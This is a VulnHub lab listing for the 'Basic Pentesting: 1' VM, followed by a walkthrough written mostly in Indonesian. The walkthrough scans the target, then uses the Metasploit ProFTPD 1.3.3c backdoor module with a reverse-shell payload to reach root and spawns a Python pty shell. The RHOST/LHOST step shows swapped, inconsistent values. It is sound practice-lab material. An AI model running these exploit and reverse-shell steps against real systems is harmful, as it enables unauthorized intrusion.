# Challenge Description

## About Release

**Name:** Basic Pentesting: 1

**Date release:** 8 Dec 2017

**Author:** Josiah Pierce

**Series:** Basic Pentesting

---

## Download

> Please remember that VulnHub is a free community resource so we are unable to check the machines that are provided to us. Before you download, please read our FAQs sections dealing with the dangers of running unknown VMs and our suggestions for “protecting yourself and your network”. If you understand the risks, please download!

* **Filename:** `basic_pentesting_1.ova` (Size: 2.6 GB)
* **Download (Google Drive):** `https://drive.google.com/file/d/1wkfI9cpyjouj6ox_88EqF6tKMtTHIYC1/view?usp=sharing`
* **Download (Mirror):** `https://download.vulnhub.com/basicpentesting/basic_pentesting_1.ova`

---

## Description

This is a small boot2root VM created for a university cyber security group. It contains multiple remote vulnerabilities and multiple privilege escalation vectors. The author tested the VM on VirtualBox (recommended). It has also been reported to work on VMware, but that was not personally tested by the author.

This VM is specifically intended for newcomers to penetration testing — difficulty is aimed at beginners.

**Goal:** Remotely attack the VM and gain root privileges. After completing the main path, try to discover other vectors that may have been missed.

If you enjoyed the VM or have questions, contact the author: **[josiah@vt.edu](mailto:josiah@vt.edu)**

If you finish the VM, please consider posting a writeup to help others.

---

## File Information

* **Filename:** `basic_pentesting_1.ova`
* **File size:** 2.6 GB
* **MD5:** `D1FB9419D73D26AB0C88D8DDB7C10A02`
* **SHA1:** `F207A5CED5369A4BA29971B932B8C683C4AA14C2`

---

## Virtual Machine

* **Format:** Virtual Machine (VirtualBox - OVA)
* **Operating System:** Linux
* **Recommended platform:** VirtualBox (tested). VMware may work but is unverified.

---

## Networking

* **DHCP service:** Enabled
* **IP address:** Automatically assigned (via DHCP)

---

## Safety & Run Notes

* Run unknown VM images in an isolated environment (host-only or on an isolated network) to avoid exposing your host/network.
* Snapshot or backup your host before importing the OVA.
* Prefer VirtualBox if you want behavior closest to the author's testing.
* Disable bridge networking unless you understand the risks and have permission to use the network segment.

---

## Author Contact & Writeups

* **Author:** Josiah Pierce — `josiah@vt.edu`
* If you produce a writeup, include commands, screenshots, and a short narrative explaining each step so others can follow.

---

## License / Attribution

This content is derived from the original VulnHub listing for *Basic Pentesting: 1*. Keep any redistribution or public writeups respectful of the author's original work and VulnHub's terms.

---

# Basic Pentesting 1 Walktrough

### First Step - Finding IP

paling pertama tentu saja kita scanning IP dari target, mari kita gunakan tools `arp-scan`

```bash
arp-scan -l
```

kemudian outputnya akan begini

```bash
Interface: eth0, type: EN10MB, MAC: 08:00:27:d4:54:92, IPv4: 192.168.56.105
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.1    0a:00:27:00:00:09       (Unknown: locally administered)
192.168.56.100  08:00:27:c1:54:ee       (Unknown)
192.168.56.110  08:00:27:d8:0b:51       (Unknown)
192.168.56.111  08:00:27:eb:6e:8f       (Unknown)

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.971 seconds (129.88 hosts/sec). 4 responded
```

ya, IP yang digunakan target adalah `192.168.56.111` karena aku tau dari guest session si VM.

<img src='img/ifconfig_server.png' width='500px'>

---

### Second Step -  Port Scanning

Sekarang adalah waktunya untuk scanning port, menggunakan tools `nmap`.

```bash
nmap -sC -sS -sV 192.168.56.111
```

kemudian dapat output seperti dibawah ini

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-17 00:38 EDT
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.111
Host is up (0.0070s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.3c
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:01:90:39:2d:8f:46:fb:03:86:73:b3:3c:54:7e:54 (RSA)
|   256 f1:f3:c0:dd:ba:a4:85:f7:13:9a:da:3a:bb:4d:93:04 (ECDSA)
|_  256 12:e2:98:d2:a3:e7:36:4f:be:6b:ce:36:6b:7e:0d:9e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:EB:6E:8F (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.68 seconds                                                              
```

disini kita mendapatkan 3 port, yaitu 

```bash
21/tcp open  ftp     ProFTPD 1.3.3c
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

### Third Step - Exploit

Aku kepikiran untuk mengecek masing masing dari **service** menggunakan tools `searchsploit`. Yang pertama mungkin aku ingin mencoba ke `ProFTPD 1.3.3c`

```bash
searchsploit ProFTPD 1.3.3c
```

outputnya begini

```bash
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Exploit Title                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
ProFTPd 1.3.3c - Compromised Source Backdoor Remote Code Execution                                                                                         | linux/remote/15662.txt
ProFTPd-1.3.3c - Backdoor Command Execution (Metasploit)                                                                                                   | linux/remote/16921.rb
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

kalau ada yang begini, bisa kita cek langsung di tools `msfconsole` untuk melakukan exploit.

Pada terminal msfconsole, lakukan command `search <service>`.

```bash
msf > search ProFTPD 1.3.3c
```

output

```bash
Matching Modules
================

#  Name                                    Disclosure Date  Rank       Check  Description
-  ----                                    ---------------  ----       -----  -----------
0  exploit/unix/ftp/proftpd_133c_backdoor  2010-12-02       excellent  No     ProFTPD-1.3.3c Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/proftpd_133c_backdoor

```

langsung saja disini kita set sebagai target exploit utama menggunakan command `use <service number>`.

```bash
msf > use 0
```

kemudian terminalnya berubah menjadi seperti ini

```bash
msf exploit(unix/ftp/proftpd_133c_backdoor) > 
```

langkah selanjutnya adalah `set payload -> set RHOST & LHOST -> exploit`. Kita gunakan command `show payloads` untuk melihat payloads yang bisa digunakan.

```bash
msf exploit(unix/ftp/proftpd_133c_backdoor) > show payloads

Compatible Payloads
===================

   #  Name                                        Disclosure Date  Rank    Check  Description
   -  ----                                        ---------------  ----    -----  -----------
   0  payload/cmd/unix/adduser                    .                normal  No     Add user with useradd
   1  payload/cmd/unix/bind_perl                  .                normal  No     Unix Command Shell, Bind TCP (via Perl)
   2  payload/cmd/unix/bind_perl_ipv6             .                normal  No     Unix Command Shell, Bind TCP (via perl) IPv6
   3  payload/cmd/unix/generic                    .                normal  No     Unix Command, Generic Command Execution
   4  payload/cmd/unix/reverse                    .                normal  No     Unix Command Shell, Double Reverse TCP (telnet)
   5  payload/cmd/unix/reverse_bash_telnet_ssl    .                normal  No     Unix Command Shell, Reverse TCP SSL (telnet)
   6  payload/cmd/unix/reverse_perl               .                normal  No     Unix Command Shell, Reverse TCP (via Perl)
   7  payload/cmd/unix/reverse_perl_ssl           .                normal  No     Unix Command Shell, Reverse TCP SSL (via perl)
   8  payload/cmd/unix/reverse_ssl_double_telnet  .                normal  No     Unix Command Shell, Double Reverse TCP SSL (telnet)
```

Disini ada banyak pilihan payloads, tapi disini aku akan memilih nomor 4 saja yaitu `payload/cmd/unix/reverse`. Gunakan command `set PAYLOAD <payload number>` untuk memilih payload.

```bash
msf exploit(unix/ftp/proftpd_133c_backdoor) > set payload 4
payload => cmd/unix/reverse
```
lalu kita cek lagi opsi yang harus di set menggunakan command `show options`

```bash
msf exploit(unix/ftp/proftpd_133c_backdoor) > show options

Module options (exploit/unix/ftp/proftpd_133c_backdoor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxi
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/bas
   RPORT    21               yes       The target port (TCP)


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

set `RHOSTS` dan `LHOST` menggunakan command `set RHOSTS <IP target>` dan `set LHOST <IP kita>`

```bash
msf exploit(unix/ftp/proftpd_133c_backdoor) > set RHOST 192.168.56.105
LHOST => 192.168.56.105
msf exploit(unix/ftp/proftpd_133c_backdoor) > set LHOST 192.168.56.111
LHOST => 192.168.56.111
```

lalu kita tinggal `run` saja

```bash
msf exploit(unix/ftp/proftpd_133c_backdoor) > run
```

disini kita dapat output seperti ini
```bash
[*] Started reverse TCP double handler on 192.168.56.105:4444 
[*] 192.168.56.111:21 - Sending Backdoor Command
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo KhMVxWc9rpd3hmZa;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket A
[*] A: "KhMVxWc9rpd3hmZa\r\n"
[*] Matching...
[*] B is input...
[*] Command shell session 1 opened (192.168.56.105:4444 -> 192.168.56.111:46206) at 2025-09-17 01:31:26 -0400
```
dan kita sudah mendapatkan `shell` dari target.

```bash
whoami
root
id
uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
```
sekarang kita sudah mendapatkan `root` dari target, langkah terakhir kita coba menggunakan python untuk menampilkan shell prompt yang lebih bagus. Menggunakan library `pty`.

```python
python -c 'import pty; pty.spawn("/bin/bash")'
```
lalu kita dapat output seperti ini
```bash
root@vtcsec:/# ls
ls
bin    dev   initrd.img  lost+found  opt   run   srv  usr
boot   etc   lib         media       proc  sbin  sys  var
cdrom  home  lib64       mnt         root  snap  tmp  vmlinuz
root@vtcsec:/# 
```